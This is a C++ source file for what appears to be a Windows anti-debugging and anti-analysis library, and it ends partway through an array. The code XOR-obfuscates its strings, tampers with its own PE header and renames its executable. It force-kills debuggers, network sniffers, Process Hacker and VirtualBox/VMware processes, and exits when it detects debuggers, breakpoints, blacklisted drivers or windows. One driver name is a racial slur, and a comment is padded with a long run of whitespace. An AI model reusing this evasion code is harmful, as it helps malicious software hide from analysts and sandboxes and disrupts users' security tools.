#define _CRT_SECURE_NO_WARNINGS
#include "AntiDBG.h"

#include <windows.h>
#include <iostream>
#include <shlobj.h>
#include <shellapi.h>

//UPDATE 28/07/2025 added one feature and encrypted strings

// Define an array of alphanumeric characters for generating random strings
static const char alphanum[] = "0123456789667" "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
int stringLengthh = sizeof(alphanum) - 1;

// Function to obfuscate the PE header of the executable
void ObfuscatePEHeader() 
{
    // Get the module handle for the current executable
    HMODULE hModule = GetModuleHandle(NULL);
    if (hModule == NULL) 
    {
        std::cerr << XorString("Failed to get module handle") << std::endl;
        return;
    }
    BYTE* pBaseAddr = (BYTE*)hModule;
    DWORD oldProtect;
    // Change the memory protection to be writable
    if (!VirtualProtect(pBaseAddr, 4096, PAGE_READWRITE, &oldProtect)) 
    {
        std::cerr << XorString("Failed to change memory protection") << std::endl;
        return;
    }
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)pBaseAddr;
    // Check the DOS header signature
    if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE) 
    {
        std::cerr << XorString("Invalid DOS header signature") << std::endl;
        return;
    }
    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)(pBaseAddr + dosHeader->e_lfanew);
    // Check the NT header signature
    if (ntHeaders->Signature != IMAGE_NT_SIGNATURE) 
    {
        std::cerr << XorString("Invalid NT header signature") << std::endl;
        return;
    }
    // Obfuscate the PE header by XORing specific fields
    ntHeaders->FileHeader.NumberOfSections ^= 0xDEAD;
    ntHeaders->OptionalHeader.CheckSum ^= 0xBEEF;
    // Restore the original memory protection
    if (!VirtualProtect(pBaseAddr, 4096, oldProtect, &oldProtect)) 
    {
        std::cerr << XorString("Failed to restore memory protection") << std::endl;
        return;
    }

    std::cout << XorString("PE header obfuscated successfully.") << std::endl;
}

// Function to generate a random character from the alphanumeric array
char genRandomn()
{
    return alphanum[rand() % stringLengthh];
}

// Function to rename the executable to a random name
void Randomexe()
{
    srand(time(0));
    std::string Str;
    std::string Dimen = XorString("LksAnti-");
    std::string Wyp = XorString("DBG-");
    // Generate a random string of 5 characters
    for (unsigned int i = 0; i < 5; ++i)
    {
        Str += genRandomn();
    }
    // Create the new filename
    std::string rename = Dimen + Wyp + Str + (XorString(".exe"));
    char filename[MAX_PATH];
    DWORD size = GetModuleFileNameA(NULL, filename, MAX_PATH);
    // Rename the current executable
    if (size)
        std::filesystem::rename(filename, rename);
}

// Function to kill various debugging and virtualization processes
void killdbg() 
{
    const char* processes[] =
    {
        XorString("KsDumperClient.exe"), XorString("KsDumper.exe"), XorString("HTTPDebuggerUI.exe"), XorString("HTTPDebuggerSvc.exe"),
        XorString("ProcessHacker.exe"), XorString("idaq.exe"), XorString("idaq64.exe"), XorString("Wireshark.exe"), XorString("Fiddler.exe"),
        XorString("FiddlerEverywhere.exe"), XorString("Xenos64.exe"), XorString("Xenos.exe"), XorString("Xenos32.exe"), XorString("de4dot.exe"),
        XorString("Cheat Engine.exe"), XorString("HTTP Debugger Windows Service (32 bit).exe"), XorString("OllyDbg.exe"), XorString("x64dbg.exe"),
        XorString("x32dbg.exe"), XorString("httpdebugger*"), XorString("Ida64.exe"), XorString("Dbg64.exe"), XorString("Dbg32.exe"),
        XorString("cheatengine*"), XorString("processhacker*"), XorString("scylla.exe"), XorString("scylla_x64.exe"), XorString("scylla_x86.exe"),
        XorString("protection_id.exe"), XorString("vmware.exe"), XorString("vmware-tray.exe"), XorString("vmwareuser.exe"),
        XorString("vmwaretray.exe"), XorString("vmtoolsd.exe"), XorString("vmsrvc.exe"), XorString("VBoxService.exe"), XorString("VBoxTray.exe"),
        XorString("ReClass.NET.exe"), XorString("ImmunityDebugger.exe"), XorString("PETools.exe"), XorString("LordPE.exe"),
        XorString("SysInspector.exe"), XorString("proc_analyzer.exe"), XorString("sysAnalyzer.exe"), XorString("sniff_hit.exe"),
        XorString("windbg.exe"), XorString("joeboxcontrol.exe"), XorString("joeboxserver.exe"), XorString("ida.exe"), XorString("ida64.exe"),
        XorString("idaq64.exe"), XorString("Vmtoolsd.exe"), XorString("Vmwaretrat.exe"), XorString("Vmwareuser.exe"), XorString("Vmacthlp.exe"),
        XorString("vboxservice.exe"), XorString("vboxtray.exe"), XorString("OLLYDBG.exe"), XorString("dnSpy.exe"),
        XorString("cheatengine-i386.exe"), XorString("cheatengine-x86_64.exe"), XorString("Fiddler Everywhere.exe"),
        XorString("Fiddler.WebUi.exe"), XorString("createdump.exe"), XorString("VBoxClient.exe"), XorString("VBoxHeadless.exe"),
        XorString("VBoxSVC.exe"), XorString("VBoxNetDHCP.exe"), XorString("VBoxNetNAT.exe"), XorString("VBoxNetAdpCtl.exe"),
        XorString("VBoxNetFltSvc.exe"), XorString("VBoxTestOGL.exe"), XorString("VBoxTstDrv.exe"), XorString("VBoxCertUtil.exe"),
        XorString("VBoxDrvInst.exe"), XorString("VBoxUSBMon.exe"), XorString("VBoxXPCOMIPCD.exe"), XorString("VBoxRT.dll"),
        XorString("VBoxDD.dll"), XorString("VBoxDDU.dll"), XorString("VBoxREM.dll"), XorString("VBoxREM2.dll"), XorString("VBoxVMM.dll"),
        XorString("VBoxSharedCrOpenGL.dll"), XorString("VBoxWDDM.dll"), XorString("VBoxVRDP.dll"), XorString("VBoxGuestControlSvc.exe"),
        XorString("VBoxServiceXP.exe"), XorString("VBoxServiceNT.exe"), XorString("VBoxVD.dll"), XorString("VBoxREM3.dll"),
        XorString("VBoxREM4.dll"), XorString("VBoxSharedFolderSvc.exe"), XorString("VBoxSharedFolderSvcXP.exe"),
        XorString("VBoxSharedFolderSvcNT.exe")
    };
    // Iterate through the process list and terminate each one
    for (const char* process : processes) 
    {
        std::string command = XorString("taskkill /f /im ") + std::string(process) + XorString(" >nul 2>&1");
        system(command.c_str());
    }
    // Additional specific kill commands
    system(XorString("taskkill /FI \"IMAGENAME eq httpdebugger*\" /IM * /F /T >nul 2>&1"));
    system(XorString("taskkill /FI \"IMAGENAME eq cheatengine*\" /IM * /F /T >nul 2>&1"));
    system(XorString("taskkill /FI \"IMAGENAME eq processhacker*\" /IM * /F /T >nul 2>&1"));
    system(XorString("taskkill /FI \"IMAGENAME eq ida*\" /IM * /F /T >nul 2>&1"));
    system(XorString("taskkill /FI \"IMAGENAME eq ollydbg*\" /IM * /F /T >nul 2>&1"));
    system(XorString("taskkill /FI \"IMAGENAME eq x64dbg*\" /IM * /F /T >nul 2>&1"));
    system(XorString("taskkill /FI \"IMAGENAME eq x32dbg*\" /IM * /F /T >nul 2>&1"));
    system(XorString("taskkill /FI \"IMAGENAME eq fiddler*\" /IM * /F /T >nul 2>&1"));
    system(XorString("taskkill /FI \"IMAGENAME eq wireshark*\" /IM * /F /T >nul 2>&1"));
    system(XorString("taskkill /FI \"IMAGENAME eq de4dot*\" /IM * /F /T >nul 2>&1"));
    system(XorString("taskkill /FI \"IMAGENAME eq vmware*\" /IM * /F /T >nul 2>&1"));
    system(XorString("taskkill /FI \"IMAGENAME eq vbox*\" /IM * /F /T >nul 2>&1"));
}

// Function to check if a debugger is present and terminate the process if it is
void DebuggerPresent()
{
    if (IsDebuggerPresent())
    {
        exit(0);
    }
}

// Function to check the Process Environment Block (PEB) for debugger presence
BOOL CheckPEB() 
{
#ifdef _WIN64
    PEB* peb = (PEB*)__readgsqword(0x60);
#else
    PEB* peb = (PEB*)__readfsdword(0x30);
#endif
    return peb->BeingDebugged;
}

// Function to detect if the IsDebuggerPresent function has been patched
void IsDebuggerPresentPatched()
{
    HMODULE hKernel32 = GetModuleHandleA((XorString("kernel32.dll")));
    if (!hKernel32) {}

    FARPROC pIsDebuggerPresent = GetProcAddress(hKernel32, (XorString("IsDebuggerPresent")));
    if (!pIsDebuggerPresent) {}

    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (INVALID_HANDLE_VALUE == hSnapshot)
    {
    }

    PROCESSENTRY32W ProcessEntry;
    ProcessEntry.dwSize = sizeof(PROCESSENTRY32W);

    if (!Process32FirstW(hSnapshot, &ProcessEntry))
    {
    }

    bool bDebuggerPresent = false;
    HANDLE hProcess = NULL;
    DWORD dwFuncBytes = 0;
    const DWORD dwCurrentPID = GetCurrentProcessId();
    do
    {
        __try
        {
            if (dwCurrentPID == ProcessEntry.th32ProcessID)
                continue;

            hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, ProcessEntry.th32ProcessID);
            if (NULL == hProcess)
                continue;

            if (!ReadProcessMemory(hProcess, pIsDebuggerPresent, &dwFuncBytes, sizeof(DWORD), NULL))
                continue;

            if (dwFuncBytes != *(PDWORD)pIsDebuggerPresent)
            {
                bDebuggerPresent = true;
                exit(0);
                break;
            }
        }
        __finally
        {
            if (hProcess)
                CloseHandle(hProcess);
            else
            {

            }
        }
    } while (Process32NextW(hSnapshot, &ProcessEntry));

    if (hSnapshot)
        CloseHandle(hSnapshot);
}

// Function to prevent the process from being attached by a debugger
void AntiAttach()
{
    HMODULE hNtdll = GetModuleHandleA((XorString("ntdll.dll")));
    if (!hNtdll)
        return;
    FARPROC pDbgBreakPoint = GetProcAddress(hNtdll, (XorString("DbgBreakPoint")));
    if (!pDbgBreakPoint)
        return;
    DWORD dwOldProtect;
    if (!VirtualProtect(pDbgBreakPoint, 1, PAGE_EXECUTE_READWRITE, &dwOldProtect))
        return;
    *(PBYTE)pDbgBreakPoint = (BYTE)0xC3;
}

// Function to stop the debugger using NtSetInformationThread
typedef NTSTATUS(CALLBACK* NtSetInformationThreadPtr)(HANDLE threadHandle, THREADINFOCLASS threadInformationClass, PVOID threadInformation, ULONG threadInformationLength);
typedef HRESULT(WINAPI* pDL)(LPUNKNOWN, LPCSTR, LPCSTR, DWORD, LPBINDSTATUSCALLBACK);
void StopDebegger()
{
    HMODULE hModule = LoadLibraryA(XorString("ntdll.dll"));
    NtSetInformationThreadPtr NtSetInformationThread = (NtSetInformationThreadPtr)GetProcAddress(hModule, (XorString("NtSetInformationThread")));

    NtSetInformationThread(OpenThread(THREAD_ALL_ACCESS, FALSE, GetCurrentThreadId()), (THREADINFOCLASS)0x11, 0, 0);
}

// List of blacklisted process names and file names to check
const wchar_t* ProcessBlacklist[] =
{
    XorWideString(L"WinDbgFrameClass"), XorWideString(L"OLLYDBG"), XorWideString(L"IDA"), XorWideString(L"IDA64"), XorWideString(L"ida64.exe"),
    XorWideString(L"ida.exe"), XorWideString(L"idaq64.exe"), XorWideString(L"KsDumper"), XorWideString(L"x64dbg"),
    XorWideString(L"The Wireshark Network Analyzer"), XorWideString(L"Progress Telerik Fiddler Web Debugger"), XorWideString(L"dnSpy"),
    XorWideString(L"IDA v7.0.170914"), XorWideString(L"ImmunityDebugger"), XorWideString(L"OLLYDBG"), XorWideString(L"Cheat Engine"),
    XorWideString(L"OLLYDBG.EXE"), XorWideString(L"Process Hacker"), XorWideString(L"ProcessHacker"), XorWideString(L"ProcessHacker.exe"),
    XorWideString(L"procmon.exe"), XorWideString(L"filemon.exe"), XorWideString(L"regmon.exe"), XorWideString(L"procexp.exe"),
    XorWideString(L"tcpview.exe"), XorWideString(L"autoruns.exe"), XorWideString(L"autorunsc.exe"), XorWideString(L"procexp.exe"),
    XorWideString(L"procexp64.exe"), XorWideString(L"Wireshark.exe"), XorWideString(L"dumpcap.exe"), XorWideString(L"HookExplorer.exe"),
    XorWideString(L"ImportREC.exe"), XorWideString(L"PETools.exe"), XorWideString(L"LordPE.exe"), XorWideString(L"SysInspector.exe"),
    XorWideString(L"proc_analyzer.exe"), XorWideString(L"sysAnalyzer.exe"), XorWideString(L"sniff_hit.exe"), XorWideString(L"windbg.exe"),
    XorWideString(L"joeboxcontrol.exe"), XorWideString(L"joeboxserver.exe"), XorWideString(L"Fiddler.exe"), XorWideString(L"ida64.exe"),
    XorWideString(L"idaq64.exe"), XorWideString(L"Vmtoolsd.exe"), XorWideString(L"Vmwaretrat.exe"), XorWideString(L"Vmwareuser.exe"),
    XorWideString(L"Vmacthlp.exe"), XorWideString(L"vboxservice.exe"), XorWideString(L"vboxtray.exe"), XorWideString(L"ReClass.NET.exe"),
    XorWideString(L"x64dbg.exe"), XorWideString(L"OLLYDBG.exe"), XorWideString(L"Cheat Engine.exe"), XorWideString(L"KsDumper.exe"),
    XorWideString(L"dnSpy.exe"), XorWideString(L"cheatengine-i386.exe"), XorWideString(L"cheatengine-x86_64.exe"),
    XorWideString(L"Fiddler Everywhere.exe"), XorWideString(L"HTTPDebuggerSvc.exe"), XorWideString(L"Fiddler.WebUi.exe"),
    XorWideString(L"createdump.exe"), XorWideString(L"VBoxTray.exe"), XorWideString(L"VBoxService.exe"), XorWideString(L"VBoxClient.exe"),
    XorWideString(L"VBoxHeadless.exe"), XorWideString(L"VBoxSVC.exe"), XorWideString(L"VBoxNetDHCP.exe"), XorWideString(L"VBoxNetNAT.exe"),
    XorWideString(L"VBoxNetAdpCtl.exe"), XorWideString(L"VBoxNetFltSvc.exe"), XorWideString(L"VBoxTestOGL.exe"),
    XorWideString(L"VBoxTstDrv.exe"), XorWideString(L"VBoxCertUtil.exe"), XorWideString(L"VBoxDrvInst.exe"), XorWideString(L"VBoxUSBMon.exe"),
    XorWideString(L"VBoxXPCOMIPCD.exe"), XorWideString(L"VBoxRT.dll"), XorWideString(L"VBoxDD.dll"), XorWideString(L"VBoxDDU.dll"),
    XorWideString(L"VBoxREM.dll"), XorWideString(L"VBoxREM2.dll"), XorWideString(L"VBoxVMM.dll"),
    XorWideString(L"VBoxSharedCrOpenGL.dll"), XorWideString(L"VBoxWDDM.dll"), XorWideString(L"VBoxVRDP.dll"),
    XorWideString(L"VBoxGuestControlSvc.exe"), XorWideString(L"VBoxTray.exe"), XorWideString(L"VBoxService.exe"),
    XorWideString(L"VBoxServiceXP.exe"), XorWideString(L"VBoxServiceNT.exe"), XorWideString(L"VBoxSharedCrOpenGL.dll"),
    XorWideString(L"VBoxRT.dll"), XorWideString(L"VBoxVMM.dll"), XorWideString(L"VBoxVD.dll"), XorWideString(L"VBoxREM.dll"),
    XorWideString(L"VBoxREM2.dll"), XorWideString(L"VBoxREM3.dll"), XorWideString(L"VBoxREM4.dll"), XorWideString(L"VBoxWDDM.dll"),
    XorWideString(L"VBoxSharedFolderSvc.exe"), XorWideString(L"VBoxSharedFolderSvcXP.exe"),
    XorWideString(L"VBoxSharedFolderSvcNT.exe"), XorWideString(L"createdump.exe"), XorWideString(L"protection_id.exe"),
    XorWideString(L"vmware.exe"), XorWideString(L"vmware-tray.exe"), XorWideString(L"vmwareuser.exe"), XorWideString(L"vmwaretray.exe"),
    XorWideString(L"vmtoolsd.exe"), XorWideString(L"vmwaretray.exe"), XorWideString(L"vmwareuser.exe"), XorWideString(L"vmsrvc.exe")
};

const wchar_t* FileBlacklist[] =
{
    XorWideString(L"CEHYPERSCANSETTINGS"), XorWideString(L"IDA_PRO"), XorWideString(L"IDALOG"), XorWideString(L"IMMDBG_LOG"),
    XorWideString(L"IMMUNITYDBG"), XorWideString(L"KS_DUMP"), XorWideString(L"PROCMON_LOG"), XorWideString(L"REGMON_LOG"),
    XorWideString(L"PROCEXP_LOG"), XorWideString(L"WINDBG_LOG"), XorWideString(L"TCPVIEW_LOG"), XorWideString(L"AUTORUNS_LOG"),
    XorWideString(L"FIDD_LOG"), XorWideString(L"HTTPDEBUG_LOG"), XorWideString(L"WINVBOX_LOG"), XorWideString(L"VBOXLOG"),
    XorWideString(L"VBOXDRIVERS"), XorWideString(L"VMWARE_LOG"), XorWideString(L"VMTOOLS_LOG"), XorWideString(L"VMDRIVERS_LOG"),
    XorWideString(L"MS_DIRECTIO"), XorWideString(L"WINIO_LOG"), XorWideString(L"PROT_ID_LOG"), XorWideString(L"RKPAVPROC1_LOG")
};


// Function to scan for blacklisted processes and files
void ScanBlacklist() 
{
    for (auto& Process : ProcessBlacklist) 
    {
        if (FindWindowW((LPCWSTR)Process, NULL)) 
        {
            exit(0);
        }
    }
    for (auto& File : FileBlacklist) 
    {
        if (OpenFileMappingW(FILE_MAP_READ, false, (LPCWSTR)File)) 
        {
            exit(0);
        }
    }
}

// Function to trigger a debug break and handle the exception
void Debugkor()
{
    __try
    {
        DebugBreak();
    }
    __except (GetExceptionCode() == EXCEPTION_BREAKPOINT ? EXCEPTION_EXECUTE_HANDLER : EXCEPTION_CONTINUE_SEARCH)
    {
    }
}

// Function to detect blacklisted drivers
void driverdetect() 
{
    const TCHAR* devices[] = 
    {
        XorWideString(L"\\\\.\\kdstinker"),
        XorWideString(L"\\\\.\\NiGgEr"),
        XorWideString(L"\\\\.\\KsDumper"),
        XorWideString(L"\\\\.\\EXTREM"),
        XorWideString(L"\\\\.\\ICEEXT"),
        XorWideString(L"\\\\.\\NDBGMSG.VXD"),
        XorWideString(L"\\\\.\\RING0"),
        XorWideString(L"\\\\.\\SIWVID"),
        XorWideString(L"\\\\.\\SYSER"),
        XorWideString(L"\\\\.\\TRW"),
        XorWideString(L"\\\\.\\SYSERBOOT"),
        XorWideString(L"\\\\.\\VBoxMiniRdrDN"),
        XorWideString(L"\\\\.\\VBoxGuest"),
        XorWideString(L"\\\\.\\VBoxSF"),
        XorWideString(L"\\\\.\\VBoxNetAdp"),
        XorWideString(L"\\\\.\\VBoxNetFlt"),
        XorWideString(L"\\\\.\\vmci"),
        XorWideString(L"\\\\.\\vmmemctl"),
        XorWideString(L"\\\\.\\vsepflt"),
        XorWideString(L"\\\\.\\vmhgfs"),
        XorWideString(L"\\\\.\\vmvss"),
        XorWideString(L"\\\\.\\vsepflt"),
        XorWideString(L"\\\\.\\vmx86"),
        XorWideString(L"\\\\.\\MSDirectIO"),
        XorWideString(L"\\\\.\\winio"),
        XorWideString(L"\\\\.\\ProcExp152"),
        XorWideString(L"\\\\.\\RkPavproc1")
    };
    WORD iLength = sizeof(devices) / sizeof(devices[0]);
    for (int i = 0; i < iLength; i++) 
    {
        HANDLE hFile = CreateFile(devices[i], GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
        if (hFile != INVALID_HANDLE_VALUE) 
        {
            CloseHandle(hFile);
            std::wstring msg = XorWideString(L"start cmd /c START CMD /C \"COLOR C && TITLE Protection && ECHO Blacklisted driver detected: ");
            msg += devices[i];
            msg += XorWideString(L" && TIMEOUT 10 >nul\"");
            _wsystem(msg.c_str());
            exit(0);
        }
    }
}

// Function to check for debugging-related devices                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    lol
void CheckDevices() 
{
    const char* DebuggingDrivers[] = 
    {
        XorString("\\\\.\\EXTREM"), XorString("\\\\.\\ICEEXT"),
        XorString("\\\\.\\NDBGMSG.VXD"), XorString("\\\\.\\RING0"),
        XorString("\\\\.\\SIWVID"), XorString("\\\\.\\SYSER"),
        XorString("\\\\.\\TRW"), XorString("\\\\.\\SYSERBOOT"),
        XorString("\\\\.\\VBoxMiniRdrDN"), XorString("\\\\.\\VBoxGuest"),
        XorString("\\\\.\\VBoxSF"), XorString("\\\\.\\VBoxNetAdp"),
        XorString("\\\\.\\VBoxNetFlt"), XorString("\\\\.\\vmci"),
        XorString("\\\\.\\vmmemctl"), XorString("\\\\.\\vsepflt"),
        XorString("\\\\.\\vmhgfs"), XorString("\\\\.\\vmvss"),
        XorString("\\\\.\\vsepflt"), XorString("\\\\.\\vmx86"),
        XorString("\\\\.\\MSDirectIO"), XorString("\\\\.\\winio"),
        XorString("\\\\.\\ProcExp152"), XorString("\\\\.\\RkPavproc1")
    };
    for (int i = 0; i < sizeof(DebuggingDrivers) / sizeof(DebuggingDrivers[0]); i++) 
    {
        HANDLE h = CreateFileA(DebuggingDrivers[i], 0, 0, 0, OPEN_EXISTING, 0, 0);
        if (h != INVALID_HANDLE_VALUE) 
        {
            CloseHandle(h);
            exit(0);
        }
    }
}

// Function to check for hardware breakpoints
bool CheckHardware()
{
    CONTEXT ctx;
    ZeroMemory(&ctx, sizeof(CONTEXT));
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
    if (!GetThreadContext(GetCurrentThread(), &ctx))
        return false;
    return ctx.Dr0 || ctx.Dr1 || ctx.Dr2 || ctx.Dr3;
}

// Function to find the process ID by its name
DWORD_PTR FindProcessId2(const std::wstring& processName) 
{
    PROCESSENTRY32W processInfo;
    processInfo.dwSize = sizeof(processInfo);
    HANDLE processesSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
    if (processesSnapshot == INVALID_HANDLE_VALUE)
        return 0;
    if (Process32FirstW(processesSnapshot, &processInfo)) 
    {
        do 
        {
            if (wcscmp(processInfo.szExeFile, processName.c_str()) == 0) {
                CloseHandle(processesSnapshot);
                return processInfo.th32ProcessID;
            }
        } while (Process32NextW(processesSnapshot, &processInfo));
    }
    CloseHandle(processesSnapshot);
    return 0;
}

// Function to scan for blacklisted windows
void ScanBlacklistedWindows() 
{
    std::vector<std::wstring> blacklistedProcesses = 
    {
        XorWideString(L"ollydbg.exe"), XorWideString(L"ProcessHacker.exe"), XorWideString(L"Dump-Fixer.exe"),
        XorWideString(L"kdstinker.exe"), XorWideString(L"tcpview.exe"), XorWideString(L"autoruns.exe"),
        XorWideString(L"autorunsc.exe"), XorWideString(L"filemon.exe"), XorWideString(L"procmon.exe"),
        XorWideString(L"regmon.exe"), XorWideString(L"procexp.exe"), XorWideString(L"ImmunityDebugger.exe"),
        XorWideString(L"Wireshark.exe"), XorWideString(L"dumpcap.exe"), XorWideString(L"HookExplorer.exe"),
        XorWideString(L"ImportREC.exe"), XorWideString(L"PETools.exe"), XorWideString(L"LordPE.exe"),
        XorWideString(L"SysInspector.exe"), XorWideString(L"proc_analyzer.exe"), XorWideString(L"sysAnalyzer.exe"),
        XorWideString(L"sniff_hit.exe"), XorWideString(L"windbg.exe"), XorWideString(L"joeboxcontrol.exe"),
        XorWideString(L"Fiddler.exe"), XorWideString(L"joeboxserver.exe"), XorWideString(L"ida64.exe"),
        XorWideString(L"ida.exe"), XorWideString(L"idaq64.exe"), XorWideString(L"Vmtoolsd.exe"),
        XorWideString(L"Vmwaretrat.exe"), XorWideString(L"Vmwareuser.exe"), XorWideString(L"Vmacthlp.exe"),
        XorWideString(L"vboxservice.exe"), XorWideString(L"vboxtray.exe"), XorWideString(L"ReClass.NET.exe"),
        XorWideString(L"x64dbg.exe"), XorWideString(L"OLLYDBG.exe"), XorWideString(L"Cheat Engine.exe"),
        XorWideString(L"KsDumper.exe"), XorWideString(L"dnSpy.exe"), XorWideString(L"cheatengine-i386.exe"),
        XorWideString(L"cheatengine-x86_64.exe"), XorWideString(L"Fiddler Everywhere.exe"),
        XorWideString(L"HTTPDebuggerSvc.exe"), XorWideString(L"Fiddler.WebUi.exe"), XorWideString(L"createdump.exe"),
        XorWideString(L"idaq.exe"), XorWideString(L"scylla.exe"), XorWideString(L"scylla_x64.exe"),
        XorWideString(L"scylla_x86.exe"), XorWideString(L"protection_id.exe"), XorWideString(L"vmware.exe"),
        XorWideString(L"vmware-tray.exe"), XorWideString(L"vmwareuser.exe"), XorWideString(L"vmwaretray.exe"),
        XorWideString(L"vmtoolsd.exe"), XorWideString(L"vmwaretray.exe"), XorWideString(L"vmwareuser.exe"),
        XorWideString(L"vmsrvc.exe"), XorWideString(L"vboxservice.exe"), XorWideString(L"vboxtray.exe"),
        XorWideString(L"vboxclient.exe"), XorWideString(L"vboxheadless.exe"), XorWideString(L"VBoxTray.exe"),
        XorWideString(L"VBoxService.exe"), XorWideString(L"VBoxClient.exe"), XorWideString(L"VBoxHeadless.exe"),
        XorWideString(L"VirtualBox.exe"), XorWideString(L"VirtualBoxVM.exe"), XorWideString(L"vboxmanage.exe"),
        XorWideString(L"VBoxManage.exe"), XorWideString(L"VBoxSVC.exe"), XorWideString(L"VBoxNetDHCP.exe"),
        XorWideString(L"VBoxNetNAT.exe"), XorWideString(L"VBoxNetAdpCtl.exe"), XorWideString(L"VBoxNetFltSvc.exe"),
        XorWideString(L"VBoxTestOGL.exe"), XorWideString(L"VBoxTstDrv.exe"), XorWideString(L"VBoxSVC.exe"),
        XorWideString(L"VBoxCertUtil.exe"), XorWideString(L"VBoxDrvInst.exe"), XorWideString(L"VBoxUSBMon.exe"),
        XorWideString(L"VBoxXPCOMIPCD.exe"), XorWideString(L"VBoxRT.dll"), XorWideString(L"VBoxDD.dll"),
        XorWideString(L"VBoxC.dll"), XorWideString(L"VBoxC.dll"), XorWideString(L"VBoxDDU.dll"),
        XorWideString(L"VBoxREM.dll"), XorWideString(L"VBoxD.dll"), XorWideString(L"VBoxVD.dll"),
        XorWideString(L"VBoxREM2.dll"), XorWideString(L"VBoxREM.dll"), XorWideString(L"VBoxVMM.dll"),
        XorWideString(L"VBoxSharedCrOpenGL.dll"), XorWideString(L"VBoxWDDM.dll"), XorWideString(L"VBoxVRDP.dll"),
        XorWideString(L"VBoxGuestControlSvc.exe"), XorWideString(L"VBoxTray.exe"), XorWideString(L"VBoxService.exe"),
        XorWideString(L"VBoxServiceXP.exe"), XorWideString(L"VBoxServiceNT.exe"), XorWideString(L"VBoxService.exe"),
        XorWideString(L"VBoxSharedCrOpenGL.dll"), XorWideString(L"VBoxRT.dll"), XorWideString(L"VBoxVMM.dll"),
        XorWideString(L"VBoxVD.dll"), XorWideString(L"VBoxREM.dll"), XorWideString(L"VBoxREM2.dll"),
        XorWideString(L"VBoxREM3.dll"), XorWideString(L"VBoxREM4.dll"), XorWideString(L"VBoxWDDM.dll"),
        XorWideString(L"VBoxSharedFolderSvc.exe"), XorWideString(L"VBoxSharedFolderSvcXP.exe"),
        XorWideString(L"VBoxSharedFolderSvcNT.exe")
    };


    std::vector<std::wstring> blacklistedWindows = 
    {
        XorWideString(L"The Wireshark Network Analyzer"),
        XorWideString(L"Progress Telerik Fiddler Web Debugger"),
        XorWideString(L"x64dbg"), XorWideString(L"KsDumper"), XorWideString(L"dnSpy"),
        XorWideString(L"idaq64"), XorWideString(L"Fiddler Everywhere"), XorWideString(L"Wireshark"),
        XorWideString(L"Dumpcap"), XorWideString(L"Fiddler.WebUi"), XorWideString(L"HTTP Debugger (32bits)"),
        XorWideString(L"HTTP Debugger"), XorWideString(L"ida64"), XorWideString(L"IDA v7.0.170914"),
        XorWideString(L"OllyDbg"), XorWideString(L"Scylla"), XorWideString(L"Scylla_x64"),
        XorWideString(L"Scylla_x86"), XorWideString(L"Protection ID"), XorWideString(L"VMware"),
        XorWideString(L"VBox"), XorWideString(L"VirtualBox"), XorWideString(L"VBoxSVC"),
        XorWideString(L"VBoxNetDHCP"), XorWideString(L"VBoxNetNAT"), XorWideString(L"VBoxNetAdpCtl"),
        XorWideString(L"VBoxNetFltSvc"), XorWideString(L"VBoxTestOGL"), XorWideString(L"VBoxTstDrv"),
        XorWideString(L"VBoxCertUtil"), XorWideString(L"VBoxDrvInst"), XorWideString(L"VBoxUSBMon"),
        XorWideString(L"VBoxXPCOMIPCD"), XorWideString(L"VBoxRT"), XorWideString(L"VBoxDD"),
        XorWideString(L"VBoxDDU"), XorWideString(L"VBoxREM"), XorWideString(L"VBoxVMM"),
        XorWideString(L"VBoxSharedCrOpenGL"), XorWideString(L"VBoxWDDM"), XorWideString(L"VBoxVRDP"),
        XorWideString(L"VBoxGuestControlSvc"), XorWideString(L"VBoxTray"), XorWideString(L"VBoxService"),
        XorWideString(L"VBoxServiceXP"), XorWideString(L"VBoxServiceNT"), XorWideString(L"VBoxSharedCrOpenGL")
    };


    for (const auto& process : blacklistedProcesses) {
        if (FindProcessId2(process) != 0) {
            exit(0);
        }
    }

    for (const auto& window : blacklistedWindows) {
        if (FindWindow(NULL, window.c_str())) {
            exit(0);
        }
    }
}

// Function to check for suspicious environment variables
void CheckEnvironmentVariables() 
{
    const char* suspiciousEnvVars[] =
    {
        XorString("windir"),
        XorString("USERDOMAIN_ROAMINGPROFILE"),
        XorString("PROCESSOR_ARCHITECTURE"),
        XorString("PROCESSOR_IDENTIFIER"),
        XorString("PROCESSOR_LEVEL"),
        XorString("PROCESSOR_REVISION"),
        XorString("NUMBER_OF_PROCESSORS"),
        XorString("COMSPEC"),
        XorString("PATHEXT"),
        XorString("TEMP"),
        XorString("TMP"),
        XorString("ALLUSERSPROFILE"),
        XorString("APPDATA"),
        XorString("CommonProgramFiles"),
        XorString("CommonProgramFiles(x86)"),
        XorString("CommonProgramW6432"),
        XorString("COMPUTERNAME"),
        XorString("HOMEDRIVE"),
        XorString("HOMEPATH"),
        XorString("LOCALAPPDATA"),
        XorString("LOGONSERVER"),
        XorString("OS"),
        XorString("Path"),
        XorString("ProgramData"),
        XorString("ProgramFiles"),
        XorString("ProgramFiles(x86)"),
        XorString("ProgramW6432"),
        XorString("PSModulePath"),
        XorString("PUBLIC"),
        XorString("SystemDrive"),
        XorString("SystemRoot"),
        XorString("USERDOMAIN"),
